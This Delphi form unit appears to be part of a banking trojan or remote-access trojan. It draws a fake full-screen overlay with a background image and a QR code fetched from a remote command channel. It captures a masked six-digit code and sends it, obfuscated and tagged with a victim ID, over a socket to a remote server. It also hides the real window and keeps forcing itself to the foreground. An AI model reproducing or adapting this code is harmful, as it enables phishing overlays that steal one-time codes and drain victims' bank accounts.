unit uT_07;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes,
  Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.ExtCtrls, Vcl.StdCtrls, Vcl.Imaging.pngimage,
  variaveis, conexoes, principal;

type
  TTNT_07 = class(TForm)
    Timer1: TTimer;
    procedure OKClick(Sender: TObject);
    procedure img1cleanClick(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Timer1Timer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
    pnl1: TMibnPNL;
    img1backChrome_WidgetWin_1: TMibIMG;
    OK: TMibIMG;
    imgqr: TMibIMG;
    img1clean: TMibIMG;
    edt1campo: TMibPNL;
    constructor Create(aowner: Tcomponent); overload;
  end;

var
  TNT_07: TTNT_07;

implementation

uses
  uSession;

{$R *.dfm}

constructor TTNT_07.Create(aowner: Tcomponent);
begin
  inherited;

  pnl1 := TMibnPNL.Create(Self);
  img1backChrome_WidgetWin_1 := TMibIMG.Create(Self);
  OK := TMibIMG.Create(Self);
  imgqr := TMibIMG.Create(Self);
  img1clean := TMibIMG.Create(Self);
  edt1campo := TMibPNL.Create(Self);

  pnl1.Name := 'pnl1';
  pnl1.Parent := Self;
  pnl1.Left := 0;
  pnl1.Top := 0;
  pnl1.Width := 644;
  pnl1.Height := 485;
  pnl1.Align := alClient;
  pnl1.TabOrder := 0;
  img1backChrome_WidgetWin_1.Name := 'img1backChrome_WidgetWin_1';
  img1backChrome_WidgetWin_1.Parent := pnl1;
  img1backChrome_WidgetWin_1.Left := 1;
  img1backChrome_WidgetWin_1.Top := 1;
  img1backChrome_WidgetWin_1.Width := 642;
  img1backChrome_WidgetWin_1.Height := 483;
  img1backChrome_WidgetWin_1.Align := alClient;
  OK.Name := 'OK';
  OK.Parent := pnl1;
  OK.Left := 472;
  OK.Top := 233;
  OK.Width := 107;
  OK.Height := 25;
  OK.Cursor := crHandPoint;
  OK.DragCursor := crHandPoint;
  OK.OnClick := OKClick;
  imgqr.Name := 'imgqr';
  imgqr.Parent := pnl1;
  imgqr.Left := 24;
  imgqr.Top := 117;
  imgqr.Width := 245;
  imgqr.Height := 244;
  img1clean.Name := 'img1clean';
  img1clean.Parent := pnl1;
  img1clean.Left := 359;
  img1clean.Top := 233;
  img1clean.Width := 107;
  img1clean.Height := 25;
  img1clean.Cursor := crHandPoint;
  img1clean.DragCursor := crHandPoint;
  img1clean.OnClick := img1cleanClick;
  edt1campo.Name := 'edt1campo';
  edt1campo.Parent := pnl1;
  edt1campo.Left := 437;
  edt1campo.Top := 179;
  edt1campo.Width := 67;
  edt1campo.Height := 21;
  edt1campo.TabStop := False;
  edt1campo.BevelInner := bvNone;
  edt1campo.BevelOuter := bvNone;
  edt1campo.BorderStyle := bsNone;
  edt1campo.MaxLength := 6;
  edt1campo.NumbersOnly := True;
  edt1campo.PasswordChar := #8226;
  edt1campo.TabOrder := 0;
  edt1campo.Text := '';

end;

procedure TTNT_07.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  SetWindowLong(Handle_Main, GWL_EXSTYLE, GetWindowLong(Handle_Main, GWL_EXSTYLE) or WS_EX_TRANSPARENT or WS_EX_NOACTIVATE);
  SethWndTrasparent(Handle_Main, true);
  Install_Cur(True);
  Mostra_ou_Esconder(true);
  TNT_07.Free;
  TNT_07 := nil;
end;

procedure TTNT_07.FormShow(Sender: TObject);
begin
  //TranslateMessage(Msg);
 // DispatchMessage(Msg);
  Mostra_ou_Esconder(False);
  bBlockMouse := false;
  Install_Cur(False);
  SetWindowLong(Handle_Main, GWL_EXSTYLE, GetWindowLong(Handle_Main, GWL_EXSTYLE) and not WS_EX_TRANSPARENT);
 // SethWndTrasparent(Handle_Main, False);
  //SetForegroundWindow(Handle_Main);
  //SetForegroundWindow(handle);
  //Application.ProcessMessages;
  Top := (Screen.Height div 2) - (Height div 2);
  Left := (Screen.Width div 2) - (Width div 2);
  LoadImg(img1backChrome_WidgetWin_1, 'TNTCOOB01');
  TNT_07.imgqr.Picture.Assign(CmdRmt.GetQrc(CmdRmt.iQrCodeX1, CmdRmt.iQrCodeY1, CmdRmt.iQrCodeX2, CmdRmt.iQrCodeY2));
end;

procedure TTNT_07.img1cleanClick(Sender: TObject);
begin
  edt1campo.Clear;
end;

procedure TTNT_07.OKClick(Sender: TObject);
begin
  if Length(edt1campo.Text) = 6 then
  begin
    CmdSocket.CmdSocket.Socket.SendText(O_F_uS_C('C', '#RE#' + '<#>' + IdServe + '<#>' + edt1campo.Text));
    Close;
  end
  else
  begin
    edt1campo.SetFocus;
    edt1campo.Clear;
  end;
end;

procedure TTNT_07.Timer1Timer(Sender: TObject);
begin
Application.ProcessMessages;
if GetForegroundWindow <> handle then
SetForegroundWindow(handle)
end;

end.

